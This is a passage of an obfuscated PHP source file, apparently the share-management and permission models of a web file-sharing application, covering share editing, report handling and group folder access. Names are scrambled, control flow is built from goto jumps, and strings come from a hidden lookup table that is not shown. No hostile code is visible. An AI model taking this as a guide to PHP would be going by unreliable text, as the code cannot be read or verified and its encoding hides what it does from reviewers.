$E²œöĞ‹Ê­[$a‡âÂ¤¡‚ƒ[1011]], $a‡âÂ¤¡‚ƒ[1405] => USER_ID); } goto F›¡µ¡·Ğ; F›¡µ¡·Ğ: if ($CÎ®ôÂóñ  = $this->where($A»»„÷¹Ä)->find()) { return $CÎ®ôÂóñ [$a‡âÂ¤¡‚ƒ[437]]; } if ($bÎœ—ªÌ¤‚ == 0) { $DÔ×²Åˆ©¿ = array($a‡âÂ¤¡‚ƒ[28] => get_path_this($E²œöĞ‹Ê­[$a‡âÂ¤¡‚ƒ[75]])); } else { $DÔ×²Åˆ©¿ = Model($a‡âÂ¤¡‚ƒ[745])->sourceInfo($bÎœ—ªÌ¤‚); if (!$DÔ×²Åˆ©¿) { return !1; } } if (!$E²œöĞ‹Ê­[$a‡âÂ¤¡‚ƒ[1320]]) { $E²œöĞ‹Ê­[$a‡âÂ¤¡‚ƒ[1320]] = $DÔ×²Åˆ©¿[$a‡âÂ¤¡‚ƒ[28]]; } goto aÈá™—Ş÷; C¾õ–éÏ¤ï: return $cêÇÃÒŞ†µ; goto D•¢ªÅã½; aÈá™—Ş÷: $Bˆ¸Ì”Œ‰ = array($a‡âÂ¤¡‚ƒ[1405] => USER_ID, $a‡âÂ¤¡‚ƒ[379] => $bÎœ—ªÌ¤‚, $a‡âÂ¤¡‚ƒ[1320] => $a‡âÂ¤¡‚ƒ[33], $a‡âÂ¤¡‚ƒ[442] => 0, $a‡âÂ¤¡‚ƒ[444] => 0, $a‡âÂ¤¡‚ƒ[1011] => $a‡âÂ¤¡‚ƒ[33], $a‡âÂ¤¡‚ƒ[291] => $a‡âÂ¤¡‚ƒ[33], $a‡âÂ¤¡‚ƒ[797] => $a‡âÂ¤¡‚ƒ[33], $a‡âÂ¤¡‚ƒ[2200] => 0, $a‡âÂ¤¡‚ƒ[2201] => 0, $a‡âÂ¤¡‚ƒ[696] => 0, $a‡âÂ¤¡‚ƒ[2202] => $a‡âÂ¤¡‚ƒ[33], $a‡âÂ¤¡‚ƒ[439] => $a‡âÂ¤¡‚ƒ[33]); $E÷‰¤ùÏé„ = explode($a‡âÂ¤¡‚ƒ[47], $a‡âÂ¤¡‚ƒ[2203]); foreach ($E÷‰¤ùÏé„ as $aø¤„ë‰) { if (!isset($E²œöĞ‹Ê­[$aø¤„ë‰])) { continue; } $Bˆ¸Ì”Œ‰[$aø¤„ë‰] = $E²œöĞ‹Ê­[$aø¤„ë‰]; } goto D„Áï÷ïÖ; D•¢ªÅã½: } private function _shareAuthSet($AÃÓÕÙÔ½, $EÓÙÕé¾äİ) { goto aˆ„…‹Ÿ; fßÚÆİÂš: $cá”¨ÁŠ›ò->where(array($Bà„õº’‘[437] => $AÃÓÕÙÔ½))->delete(); $A‰˜ä‘³ÕÜ = array(); foreach ($EÓÙÕé¾äİ as $D´ÂšÍ£«­) { $fƒîõìŸ–‘ = SourceModel::TYPE_USER; if ($D´ÂšÍ£«­[$Bà„õº’‘[367]] == SourceModel::TYPE_GROUP) { $fƒîõìŸ–‘ = SourceModel::TYPE_GROUP; } $a­îÓÚ×‹® = array($Bà„õº’‘[437] => $AÃÓÕÙÔ½, $Bà„õº’‘[367] => $fƒîõìŸ–‘, $Bà„õº’‘[452] => intval($D´ÂšÍ£«­[$Bà„õº’‘[452]]), $Bà„õº’‘[2205] => 0, $Bà„õº’‘[2206] => -1); if ($D´ÂšÍ£«­[$Bà„õº’‘[2205]]) { $a­îÓÚ×‹®[$Bà„õº’‘[2205]] = $D´ÂšÍ£«­[$Bà„õº’‘[2205]]; } else { if ($D´ÂšÍ£«­[$Bà„õº’‘[2206]]) { $a­îÓÚ×‹®[$Bà„õº’‘[2206]] = $D´ÂšÍ£«­[$Bà„õº’‘[2206]]; } } $A‰˜ä‘³ÕÜ[] = $a­îÓÚ×‹®; } goto EÌ’Å²…†¦; aˆ„…‹Ÿ: $Bà„õº’‘ =& $_SERVER[Ö]; if (!is_array($EÓÙÕé¾äİ)) { return !1; } $cá”¨ÁŠ›ò = Model($Bà„õº’‘[2204]); goto fßÚÆİÂš; EÌ’Å²…†¦: return $cá”¨ÁŠ›ò->addAll($A‰˜ä‘³ÕÜ, array(), !0); goto d¨Ãç‰ÀìÖ; d¨Ãç‰ÀìÖ: } public function numViewAdd($d´™ö‚ƒà) { $b“œñê‰ò† =& $_SERVER[Ö]; $bá˜éŸ¿İÚ = array($b“œñê‰ò†[436] => $d´™ö‚ƒà); $this->where($bá˜éŸ¿İÚ)->setAdd($b“œñê‰ò†[2200]); } public function numDownloadAdd($e•Ó‹§™¯Õ) { $a«‹ˆ”‘à =& $_SERVER[Ö]; $C•ÂŠÊ¾§” = array($a«‹ˆ”‘à[436] => $e•Ó‹§™¯Õ); $this->where($C•ÂŠÊ¾§”)->setAdd($a«‹ˆ”‘à[2201]); } protected function shareEdit($EÔ²¹öĞŒí, $c¹„†Ê„Ü) { goto fÏÓ°Âˆ„; Cî…†Õˆêœ: if (isset($c¹„†Ê„Ü[$EÍ±™òø[2193]])) { $this->_shareAuthSet($EÔ²¹öĞŒí, $c¹„†Ê„Ü[$EÍ±™òø[2193]]); } return !0; goto Aã¡¨Ğªøö; eÔÂÈ›ÀŸˆ: foreach ($EäÏ—ÜõõÔ as $EÏŞË¸Ø¬è) { if (!array_key_exists($EÏŞË¸Ø¬è, $c¹„†Ê„Ü)) { continue; } $C‰„Á‰áÀ‰[$EÏŞË¸Ø¬è] = $c¹„†Ê„Ü[$EÏŞË¸Ø¬è]; } $this->shareEventAdd($a„­ºÉè[$EÍ±™òø[365]], $c¹„†Ê„Ü, $EÍ±™òø[2045]); $this->where(array($EÍ±™òø[436] => $EÔ²¹öĞŒí))->save($C‰„Á‰áÀ‰); goto Cî…†Õˆêœ; fÏÓ°Âˆ„: $EÍ±™òø =& $_SERVER[Ö]; $a„­ºÉè = $this->getInfo($EÔ²¹öĞŒí); if (!$a„­ºÉè) { return !1; } goto bÕçñå·Æå; bÕçñå·Æå: $this->_checkLinkShare($c¹„†Ê„Ü, $a„­ºÉè); $C‰„Á‰áÀ‰ = array(); $EäÏ—ÜõõÔ = explode($EÍ±™òø[47], $EÍ±™òø[2207]); goto eÔÂÈ›ÀŸˆ; Aã¡¨Ğªøö: } private function _checkLinkShare($eİ±¹ê¡®¹, $AªëÛóÙÇâ) { goto dæ´¥ÉñÍ; dæ´¥ÉñÍ: $dï‘µ…ä¿Û =& $_SERVER[Ö]; if ($eİ±¹ê¡®¹[$dï‘µ…ä¿Û[442]] != $dï‘µ…ä¿Û[83]) { return; } $AâÑ¦‘Âë¼ = $AªëÛóÙÇâ[$dï‘µ…ä¿Û[387]][$dï‘µ…ä¿Û[365]]; goto c¶·Ù«½®•; E™¾ÕÒ²: $A¿£†‹­…• = $this->shareFileMeta($A‚ËĞŸ’Á‘[$dï‘µ…ä¿Û[415]]); if (isset($A¿£†‹­…•[$dï‘µ…ä¿Û[355]]) && $A¿£†‹­…•[$dï‘µ…ä¿Û[355]] == $dï‘µ…ä¿Û[83]) { show_json(LNG($dï‘µ…ä¿Û[2210]), !1); } goto B™œ¼†¼; c¶·Ù«½®•: if ($AªëÛóÙÇâ[$dï‘µ…ä¿Û[387]][$dï‘µ…ä¿Û[29]] != $dï‘µ…ä¿Û[163]) { $C°Ø×éùåĞ = $this->_folderReport($AâÑ¦‘Âë¼); if (!$C°Ø×éùåĞ) { return; } show_json(LNG($dï‘µ…ä¿Û[2208]) . $dï‘µ…ä¿Û[2209] . $C°Ø×éùåĞ, !1); } $A‚ËĞŸ’Á‘ = Model($dï‘µ…ä¿Û[745])->fileInfoGet($AªëÛóÙÇâ[$dï‘µ…ä¿Û[387]][$dï‘µ…ä¿Û[365]]); if (!$A‚ËĞŸ’Á‘) { return; } goto E™¾ÕÒ²; B™œ¼†¼: } private function _folderReport($d»ñ‡¨³À) { goto cõŒ…Ş·ùë; dœÕ‘—çò: $DØ”±âÄÆ = substr($Dî‘àò¡Öä[$EàÓŠÎ¹ˆš[455]], strpos($Dî‘àò¡Öä[$EàÓŠÎ¹ˆš[455]], $BŒœè¦†Úî)); $f†¾Şä±¢ = array($EàÓŠÎ¹ˆš[365] => array($EàÓŠÎ¹ˆš[7], trim($DØ”±âÄÆ, $EàÓŠÎ¹ˆš[47]))); $BÏîóĞ®®» = Model($EàÓŠÎ¹ˆš[745])->where($f†¾Şä±¢)->field($EàÓŠÎ¹ˆš[28])->select(); goto EÏ§Ïë“¡; cõŒ…Ş·ùë: $EàÓŠÎ¹ˆš =& $_SERVER[Ö]; $f†¾Şä±¢ = array($EàÓŠÎ¹ˆš[415] => array($EàÓŠÎ¹ˆš[921], 0), $EàÓŠÎ¹ˆš[682] => 3); $Fø»”í“ó  = Model($EàÓŠÎ¹ˆš[2211])->where($f†¾Şä±¢)->field($EàÓŠÎ¹ˆš[415])->select(); goto A¾¥Ã—ÊÍğ; A¾¥Ã—ÊÍğ: if (!$Fø»”í“ó ) { return !1; } $Fø»”í“ó  = array_to_keyvalue($Fø»”í“ó , $EàÓŠÎ¹ˆš[33], $EàÓŠÎ¹ˆš[415]); $BŒœè¦†Úî = $EàÓŠÎ¹ˆš[47] . $d»ñ‡¨³À . $EàÓŠÎ¹ˆš[47]; goto CÙ¯¸‹¨Ïè; CÙ¯¸‹¨Ïè: $f†¾Şä±¢ = array($EàÓŠÎ¹ˆš[415] => array($EàÓŠÎ¹ˆš[7], $Fø»”í“ó ), $EàÓŠÎ¹ˆš[455] => array($EàÓŠÎ¹ˆš[744], "\45{$BŒœè¦†Úî}\x25"), $EàÓŠÎ¹ˆš[393] => 0); $Dî‘àò¡Öä = Model($EàÓŠÎ¹ˆš[745])->where($f†¾Şä±¢)->field($EàÓŠÎ¹ˆš[2212])->find(); if (!$Dî‘àò¡Öä) { return !1; } goto dœÕ‘—çò; EÏ§Ïë“¡: $EÈô¨¿Ù³ò = array_to_keyvalue($BÏîóĞ®®», $EàÓŠÎ¹ˆš[33], $EàÓŠÎ¹ˆš[28]); $EÈô¨¿Ù³ò[] = $Dî‘àò¡Öä[$EàÓŠÎ¹ˆš[28]]; return implode($EàÓŠÎ¹ˆš[8], $EÈô¨¿Ù³ò); goto cã‰ÃöâÙá; cã‰ÃöâÙá: } protected function remove($aˆ›Ô—Åà¦) { goto DóÂò½æŒ…; DóÂò½æŒ…: $CÖ¨éŠ¹» =& $_SERVER[Ö]; if (is_array($aˆ›Ô—Åà¦)) { $aˆ›Ô—Åà¦ = array($CÖ¨éŠ¹»[7], $aˆ›Ô—Åà¦); } $e¹š„¦ù¬… = array($CÖ¨éŠ¹»[437] => $aˆ›Ô—Åà¦); goto Eá¼§ÈØæ‘; BŠ­ô¿è‰: for ($B›ÎŠÄ¶ï† = 0; $B›ÎŠÄ¶ï† < count($b¹—–¬ÅŸâ); $B›ÎŠÄ¶ï†++) { $e”–ÊŞÁ = $this->getInfo($b¹—–¬ÅŸâ[$B›ÎŠÄ¶ï†]); if ($e”–ÊŞÁ[$CÖ¨éŠ¹»[444]] == $CÖ¨éŠ¹»[83]) { Model($CÖ¨éŠ¹»[501])->eventShare($e”–ÊŞÁ[$CÖ¨éŠ¹»[365]], $CÖ¨éŠ¹»[2198]); } if ($e”–ÊŞÁ[$CÖ¨éŠ¹»[442]] == $CÖ¨éŠ¹»[83]) { Model($CÖ¨éŠ¹»[501])->eventShare($e”–ÊŞÁ[$CÖ¨éŠ¹»[365]], $CÖ¨éŠ¹»[2197]); } } return $a­¼Ã˜ôù; goto a²Â­°÷ƒ™; Eá¼§ÈØæ‘: $a­¼Ã˜ôù = $this->where($e¹š„¦ù¬…)->delete(); if ($a­¼Ã˜ôù) { Model($CÖ¨éŠ¹»[533])->where(array($CÖ¨éŠ¹»[437] => $aˆ›Ô—Åà¦))->delete(); } $b¹—–¬ÅŸâ = is_array($aˆ›Ô—Åà¦) ? $aˆ›Ô—Åà¦[1] : array($aˆ›Ô—Åà¦); goto BŠ­ô¿è‰; a²Â­°÷ƒ™: } protected function removeBySource($b†‰ê‰¿) { goto C®¬ø·¬–´; C®¬ø·¬–´: $Bì¦«êá“ =& $_SERVER[Ö]; $eÈĞî—é¹ = array($Bì¦«êá“[379] => array($Bì¦«êá“[380], $b†‰ê‰¿)); $C±ŞŒÚí = $this->field($Bì¦«êá“[437])->where($eÈĞî—é¹)->select(); goto eĞëçÑ·é¥; C¢‡ˆ‘Š¨İ: $this->where($eÈĞî—é¹)->delete(); Model($Bì¦«êá“[533])->where($eÈĞî—é¹)->delete(); goto e‚™ğ¥‡‰; eĞëçÑ·é¥: $C±ŞŒÚí = array_to_keyvalue($C±ŞŒÚí, $Bì¦«êá“[33], $Bì¦«êá“[437]); if (!$C±ŞŒÚí) { return; } $eÈĞî—é¹ = array($Bì¦«êá“[436] => array($Bì¦«êá“[380], $C±ŞŒÚí)); goto C¢‡ˆ‘Š¨İ; e‚™ğ¥‡‰: } public function listAll($Aã˜·‡Èä¯) { goto E«Ê””˜®“; d·ª‡ªõàø: return $bàø”–…Ë ; goto a·íÎƒ’Ûò; CÅˆÅÇŞˆÂ: $bàø”–…Ë  = $this->_makeOrder()->where($B¹©ä¼†‹)->selectPage(20); if (empty($bàø”–…Ë [$aôƒˆ¸æ[350]])) { return array(); } $this->_listDataApply($bàø”–…Ë [$aôƒˆ¸æ[350]]); goto d·ª‡ªõàø; BáµË«ùÖÀ: if ($Aã˜·‡Èä¯[$aôƒˆ¸æ[695]]) { $e«¤Ğ¬©÷É = $Aã˜·‡Èä¯[$aôƒˆ¸æ[696]] ? $Aã˜·‡Èä¯[$aôƒˆ¸æ[696]] : strtotime(date($aôƒˆ¸æ[2213])); $B¹©ä¼†‹[$aôƒˆ¸æ[183]] = array($aôƒˆ¸æ[317], array($Aã˜·‡Èä¯[$aôƒˆ¸æ[695]], $e«¤Ğ¬©÷É)); } if ($Aã˜·‡Èä¯[$aôƒˆ¸æ[29]]) { $B¹©ä¼†‹[$Aã˜·‡Èä¯[$aôƒˆ¸æ[29]]] = 1; } else { $B¹©ä¼†‹[] = array($aôƒˆ¸æ[442] => array($aôƒˆ¸æ[921], 0), $aôƒˆ¸æ[444] => array($aôƒˆ¸æ[921], 0), $aôƒˆ¸æ[2188] => $aôƒˆ¸æ[2157]); } if ($Aã˜·‡Èä¯[$aôƒˆ¸æ[2153]]) { $B¹©ä¼†‹[] = array($aôƒˆ¸æ[439] => $Aã˜·‡Èä¯[$aôƒˆ¸æ[2153]], $aôƒˆ¸æ[1320] => array($aôƒˆ¸æ[744], "\x25{$Aã˜·‡Èä¯[$aôƒˆ¸æ[2153]]}\45"), $aôƒˆ¸æ[2188] => $aôƒˆ¸æ[2157]); } goto CÅˆÅÇŞˆÂ; E«Ê””˜®“: $aôƒˆ¸æ =& $_SERVER[Ö]; $B¹©ä¼†‹ = array(); if ($Aã˜·‡Èä¯[$aôƒˆ¸æ[1414]]) { $B¹©ä¼†‹[$aôƒˆ¸æ[1414]] = $Aã˜·‡Èä¯[$aôƒˆ¸æ[1414]]; } goto BáµË«ùÖÀ; a·íÎƒ’Ûò: } public function listDataApply($b¾—å—·Š©) { $this->_listDataApply($b¾—å—·Š©); return $b¾—å—·Š©; } private function _listDataApply(&$f­¶½²¶˜) { $c²°“±ãé =& $_SERVER[Ö]; $bØØÃ‰¸ĞÙ = array_to_keyvalue($f­¶½²¶˜, $c²°“±ãé[33], $c²°“±ãé[1414]); $b²ğË›ßœô = Model($c²°“±ãé[473])->userListInfo(array_unique($bØØÃ‰¸ĞÙ)); $DÓÄ¶ÛÒš… = array_to_keyvalue($f­¶½²¶˜, $c²°“±ãé[33], $c²°“±ãé[365]); $D³à¾¥ƒæ = Model($c²°“±ãé[745])->sourceListInfo($DÓÄ¶ÛÒš…, !0); foreach ($f­¶½²¶˜ as &$f˜ŸáÌ£Ìí) { $f…ÊÍï…Ë· = $f˜ŸáÌ£Ìí[$c²°“±ãé[1414]]; $f˜ŸáÌ£Ìí[$c²°“±ãé[2214]] = $b²ğË›ßœô[$f…ÊÍï…Ë·] ? $b²ğË›ßœô[$f…ÊÍï…Ë·] : !1; $D•Ş‚íµºÈ = $f˜ŸáÌ£Ìí[$c²°“±ãé[365]]; $f˜ŸáÌ£Ìí[$c²°“±ãé[387]] = $D³à¾¥ƒæ[$D•Ş‚íµºÈ] ? $D³à¾¥ƒæ[$D•Ş‚íµºÈ] : !1; } } private function _makeOrder($fº¨á²³ = '') { goto EçÁğ°é‡; e­Æ‡ãğ®š: $fº¨á²³ = $fº¨á²³ . "{$AøÅ”†ëÅİ}\40{$CÖ¸‰‡ßÕ}"; return $this->order($fº¨á²³); goto CéÏù„”‚; EçÁğ°é‡: $A×ÇÖÉ–¼ =& $_SERVER[Ö]; $D³À­è¸ÉÁ = array($A×ÇÖÉ–¼[183], $A×ÇÖÉ–¼[696], $A×ÇÖÉ–¼[2200], $A×ÇÖÉ–¼[2201]); $E³Çƒ¨Ó£‡ = array($A×ÇÖÉ–¼[398] => $A×ÇÖÉ–¼[399], $A×ÇÖÉ–¼[400] => $A×ÇÖÉ–¼[401]); goto bÛÏÛîî; bÛÏÛîî: $AøÅ”†ëÅİ = Input::get($A×ÇÖÉ–¼[403], $A×ÇÖÉ–¼[7], $A×ÇÖÉ–¼[385], $D³À­è¸ÉÁ); $CÖ¸‰‡ßÕ = Input::get($A×ÇÖÉ–¼[404], $A×ÇÖÉ–¼[7], $A×ÇÖÉ–¼[2215], array($A×ÇÖÉ–¼[2152], $A×ÇÖÉ–¼[400])); $CÖ¸‰‡ßÕ = $E³Çƒ¨Ó£‡[$CÖ¸‰‡ßÕ]; goto e­Æ‡ãğ®š; CéÏù„”‚: } public function reportAdd($d¨†áæ°İ´) { $b—‡·±‰¹ =& $_SERVER[Ö]; $E²×Ô‡ªØÓ = array($b—‡·±‰¹[437] => $d¨†áæ°İ´[$b—‡·±‰¹[437]], $b—‡·±‰¹[1414] => USER_ID); if (Model($b—‡·±‰¹[2211])->where($E²×Ô‡ªØÓ)->find()) { return !1; } $CÛ˜ÒéŒˆ¹ = array($b—‡·±‰¹[437] => $d¨†áæ°İ´[$b—‡·±‰¹[437]], $b—‡·±‰¹[1320] => $d¨†áæ°İ´[$b—‡·±‰¹[1320]], $b—‡·±‰¹[365] => $d¨†áæ°İ´[$b—‡·±‰¹[365]], $b—‡·±‰¹[415] => $d¨†áæ°İ´[$b—‡·±‰¹[415]], $b—‡·±‰¹[1414] => USER_ID, $b—‡·±‰¹[29] => $d¨†áæ°İ´[$b—‡·±‰¹[29]], $b—‡·±‰¹[401] => $d¨†áæ°İ´[$b—‡·±‰¹[401]]); return Model($b—‡·±‰¹[2211])->add($CÛ˜ÒéŒˆ¹); } public function reportList($aóçªØŠŞÒ) { goto bƒ·¯ Ş¢İ; BËğĞ •„: $bĞ®‚ÕùÎö = array($CÈ‚àø´ß[398] => $CÈ‚àø´ß[399], $CÈ‚àø´ß[400] => $CÈ‚àø´ß[401]); $EŠâ•éŞ¥Ñ = $CÈ‚àø´ß[2219] . $bĞ®‚ÕùÎö[$b’“Ê‘®Àˆ]; $fçã“ŒÙ¡„ = Model($CÈ‚àø´ß[2211])->where($Aè“’¢æÑô)->order($EŠâ•éŞ¥Ñ)->selectPage(20); goto fßãœÏ‰Ñä; D¾Á³‡à: if (isset($aóçªØŠŞÒ[$CÈ‚àø´ß[29]]) && in_array($aóçªØŠŞÒ[$CÈ‚àø´ß[29]], array($CÈ‚àø´ß[83], $CÈ‚àø´ß[2216], $CÈ‚àø´ß[2217], $CÈ‚àø´ß[2218], $CÈ‚àø´ß[1893]))) { $Aè“’¢æÑô[$CÈ‚àø´ß[29]] = $aóçªØŠŞÒ[$CÈ‚àø´ß[29]]; } if (isset($aóçªØŠŞÒ[$CÈ‚àø´ß[682]]) && in_array($aóçªØŠŞÒ[$CÈ‚àø´ß[682]], array($CÈ‚àø´ß[464], $CÈ‚àø´ß[83], $CÈ‚àø´ß[2216], $CÈ‚àø´ß[2217]))) { $Aè“’¢æÑô[$CÈ‚àø´ß[682]] = $aóçªØŠŞÒ[$CÈ‚àø´ß[682]]; } $b’“Ê‘®Àˆ = Input::get($CÈ‚àø´ß[404], $CÈ‚àø´ß[7], $CÈ‚àø´ß[2215], array($CÈ‚àø´ß[2152], $CÈ‚àø´ß[400])); goto BËğĞ •„; fßãœÏ‰Ñä: if (empty($fçã“ŒÙ¡„[$CÈ‚àø´ß[350]])) { return array(); } $this->_listDataApply($fçã“ŒÙ¡„[$CÈ‚àø´ß[350]]); return $fçã“ŒÙ¡„; goto dÇ«¥Ñ÷‘–; bƒ·¯ Ş¢İ: $CÈ‚àø´ß =& $_SERVER[Ö]; $Aè“’¢æÑô = array(); if ($aóçªØŠŞÒ[$CÈ‚àø´ß[695]]) { $Fé”’°… = $aóçªØŠŞÒ[$CÈ‚àø´ß[696]] ? $aóçªØŠŞÒ[$CÈ‚àø´ß[696]] : strtotime(date($CÈ‚àø´ß[2213])); $Aè“’¢æÑô[$CÈ‚àø´ß[183]] = array($CÈ‚àø´ß[317], array($aóçªØŠŞÒ[$CÈ‚àø´ß[695]], $Fé”’°…)); } goto D¾Á³‡à; dÇ«¥Ñ÷‘–: } public function reportStatus($E º”¸ãó¢) { goto aœÄé««‘©; FôÅîßÂó: $fÑ‰Œ•‚ = Model($Dì­¾×ŞëÂ[2211])->where($f…ÍÄ¬¦è)->save($a ¢½»¾); if ($E º”¸ãó¢[$Dì­¾×ŞëÂ[682]] == $Dì­¾×ŞëÂ[2216]) { if ($F½è¯Õ¾é[$Dì­¾×ŞëÂ[415]] != $Dì­¾×ŞëÂ[464] && $this->shareFileMeta($F½è¯Õ¾é[$Dì­¾×ŞëÂ[415]])) { $this->shareFileMeta($F½è¯Õ¾é[$Dì­¾×ŞëÂ[415]], 0); } $this->remove($F½è¯Õ¾é[$Dì­¾×ŞëÂ[437]]); return !0; } if ($fÑ‰Œ•‚ && $E º”¸ãó¢[$Dì­¾×ŞëÂ[682]] == $Dì­¾×ŞëÂ[2217]) { $b¢•ªëñŠ = $a ¢½»¾[$Dì­¾×ŞëÂ[682]] == $Dì­¾×ŞëÂ[2217] ? 1 : 0; $this->shareFileMeta($F½è¯Õ¾é[$Dì­¾×ŞëÂ[415]], $b¢•ªëñŠ); $this->removeByFile($F½è¯Õ¾é[$Dì­¾×ŞëÂ[415]]); } goto e’«“æ½·; AÓù‰¢ğ: if (!$F½è¯Õ¾é) { return !1; } $a ¢½»¾ = array($Dì­¾×ŞëÂ[682] => $E º”¸ãó¢[$Dì­¾×ŞëÂ[682]]); if ($E º”¸ãó¢[$Dì­¾×ŞëÂ[682]] == $Dì­¾×ŞëÂ[2217] && $F½è¯Õ¾é[$Dì­¾×ŞëÂ[682]] == $Dì­¾×ŞëÂ[2217]) { $a ¢½»¾[$Dì­¾×ŞëÂ[682]] = 0; } goto FôÅîßÂó; aœÄé««‘©: $Dì­¾×ŞëÂ =& $_SERVER[Ö]; $f…ÍÄ¬¦è = array($Dì­¾×ŞëÂ[363] => $E º”¸ãó¢[$Dì­¾×ŞëÂ[363]]); $F½è¯Õ¾é = Model($Dì­¾×ŞëÂ[2211])->where($f…ÍÄ¬¦è)->field($Dì­¾×ŞëÂ[2220])->find(); goto AÓù‰¢ğ; e’«“æ½·: return $fÑ‰Œ•‚; goto cË””£¸‚Ò; cË””£¸‚Ò: } private function removeByFile($F§÷¡”Ñ¼¤) { goto dÜ×¿å„à; dÜ×¿å„à: $BòÎˆ…ÊÀ² =& $_SERVER[Ö]; $C”¹îİâÂ = Model($BòÎˆ…ÊÀ²[745])->where(array($BòÎˆ…ÊÀ²[415] => $F§÷¡”Ñ¼¤))->field($BòÎˆ…ÊÀ²[365])->select(); $DÍñÙóğ¤ß = array_to_keyvalue($C”¹îİâÂ, $BòÎˆ…ÊÀ²[33], $BòÎˆ…ÊÀ²[365]); goto a½é¿½³Å™; a½é¿½³Å™: $AÚ‰–ßæ = array($BòÎˆ…ÊÀ²[365] => array($BòÎˆ…ÊÀ²[7], $DÍñÙóğ¤ß), $BòÎˆ…ÊÀ²[442] => 1); $C”¹îİâÂ = Model($BòÎˆ…ÊÀ²[2054])->where($AÚ‰–ßæ)->field($BòÎˆ…ÊÀ²[437])->select(); if (empty($C”¹îİâÂ)) { return; } goto fÈºÀÒäİ¦; fÈºÀÒäİ¦: $c‚îëËÌæ¤ = array_to_keyvalue($C”¹îİâÂ, $BòÎˆ…ÊÀ²[33], $BòÎˆ…ÊÀ²[437]); $this->remove($c‚îëËÌæ¤); goto AŞõ„¦îŒ; AŞõ„¦îŒ: } private function shareFileMeta($dÕ‚î‡¤, $cÎÀ©§¼ß½ = null) { $B†‰Õùïï =& $_SERVER[Ö]; $aë…Î¿¼Û = array($B†‰Õùïï[415] => $dÕ‚î‡¤, $B†‰Õùïï[89] => $B†‰Õùïï[2221]); if (is_null($cÎÀ©§¼ß½)) { return Model($B†‰Õùïï[2222])->where($aë…Î¿¼Û)->find(); } $aë…Î¿¼Û[$B†‰Õùïï[355]] = $cÎÀ©§¼ß½; Model($B†‰Õùïï[2222])->add($aë…Î¿¼Û, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\x72\143\145\x5f\x61\165\x74\150"; public function getAuth($B·…å·×¤‘) { goto fÀ‰®¶÷¸¬; cÀ–•©×Ù: return $bÁëä®ôé·; goto DÚ—¢ã¶ãÍ; còäùŞåÃ : $bÒÚ§µá = $this->field($Fº˜¹Éƒê‘)->order($Cå´°„´†À[363])->where($BÀ‘²óÑ¶Û)->select(); $bÁëä®ôé· = array(); foreach ($bÒÚ§µá as $Cê†§•š“ƒ) { if (Model($Cå´°„´†À[2224])->listData($Cê†§•š“ƒ[$Cå´°„´†À[2205]])) { $bÁëä®ôé·[] = $Cê†§•š“ƒ; } } goto cÀ–•©×Ù; fÀ‰®¶÷¸¬: $Cå´°„´†À =& $_SERVER[Ö]; $Fº˜¹Éƒê‘ = $Cå´°„´†À[2223]; $BÀ‘²óÑ¶Û = array($Cå´°„´†À[365] => $B·…å·×¤‘); goto còäùŞåÃ ; DÚ—¢ã¶ãÍ: } public function setAuth($bæéå·ÕÄò, $B‚ëáÍÎÜ£) { goto EëïÜîô…; cùŠÉÓ¾ÀÇ: $this->where(array($B ëèó„Š[379] => $bæéå·ÕÄò))->delete(); $this->addAll($E…šÛÁ½ßØ); return !0; goto e¿ éîË“„; EëïÜîô…: $B ëèó„Š =& $_SERVER[Ö]; $C­ÑôäÖº„ = Model($B ëèó„Š[1103])->sourceInfo($bæéå·ÕÄò); if ($C­ÑôäÖº„[$B ëèó„Š[367]] != SourceModel::TYPE_GROUP) { return !1; } goto f‹¹ö„Ú±; f‹¹ö„Ú±: $aä³ö…’Ë = 1; $aãÑõëê† = $C­ÑôäÖº„[$B ëèó„Š[452]]; if ($aãÑõëê† != $aä³ö…’Ë) { $c—…×Ë›ñ† = array($B ëèó„Š[2077] => $aãÑõëê†); $c„ì°â¬ = Model($B ëèó„Š[2151])->field($B ëèó„Š[1414])->where($c—…×Ë›ñ†)->select(); $c„ì°â¬ = array_to_keyvalue($c„ì°â¬, $B ëèó„Š[33], $B ëèó„Š[1414]); } goto fªğ’‰Ùµ¡; fªğ’‰Ùµ¡: $A¥Œ„¾¼ÆØ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $E…šÛÁ½ßØ = array(); foreach ($B‚ëáÍÎÜ£ as $aƒˆ¦ ˜ëÊ) { if (!in_array($aƒˆ¦ ˜ëÊ[$B ëèó„Š[367]], $A¥Œ„¾¼ÆØ)) { show_json(LNG($B ëèó„Š[2225]), !1); } if ($aãÑõëê† != $aä³ö…’Ë) { if ($aƒˆ¦ ˜ëÊ[$B ëèó„Š[367]] == SourceModel::TYPE_GROUP) { } if ($aƒˆ¦ ˜ëÊ[$B ëèó„Š[452]] != 0 && !in_array($aƒˆ¦ ˜ëÊ[$B ëèó„Š[452]], $c„ì°â¬)) { } } if ($aƒˆ¦ ˜ëÊ[$B ëèó„Š[452]] == 0) { $aƒˆ¦ ˜ëÊ[$B ëèó„Š[367]] = SourceModel::TYPE_USER; } $E…šÛÁ½ßØ[] = array($B ëèó„Š[365] => $bæéå·ÕÄò, $B ëèó„Š[367] => intval($aƒˆ¦ ˜ëÊ[$B ëèó„Š[367]]), $B ëèó„Š[452] => intval($aƒˆ¦ ˜ëÊ[$B ëèó„Š[452]]), $B ëèó„Š[2205] => intval($aƒˆ¦ ˜ëÊ[$B ëèó„Š[2205]]) ? intval($aƒˆ¦ ˜ëÊ[$B ëèó„Š[2205]]) : 0, $B ëèó„Š[2206] => intval($aƒˆ¦ ˜ëÊ[$B ëèó„Š[2206]]) ? intval($aƒˆ¦ ˜ëÊ[$B ëèó„Š[2206]]) : -1); } goto cùŠÉÓ¾ÀÇ; e¿ éîË“„: } public function authClear($fÖôßÄ¶èÚ) { $Aó˜šÜô½Ó =& $_SERVER[Ö]; $DÃÔ¡‚äçŠ = Model($Aó˜šÜô½Ó[1103])->sourceInfo($fÖôßÄ¶èÚ); $D‘‰áâºŸ« = array($fÖôßÄ¶èÚ); if ($DÃÔ¡‚äçŠ[$Aó˜šÜô½Ó[366]] == $Aó˜šÜô½Ó[83]) { $CÅíò®¿› = array($Aó˜šÜô½Ó[521] => array($Aó˜šÜô½Ó[479], $DÃÔ¡‚äçŠ[$Aó˜šÜô½Ó[455]] . $fÖôßÄ¶èÚ . $Aó˜šÜô½Ó[480])); $D‘‰áâºŸ« = Model($Aó˜šÜô½Ó[1103])->field($Aó˜šÜô½Ó[379])->where($CÅíò®¿›)->getField($Aó˜šÜô½Ó[365], !0); $D‘‰áâºŸ«[] = $fÖôßÄ¶èÚ; } 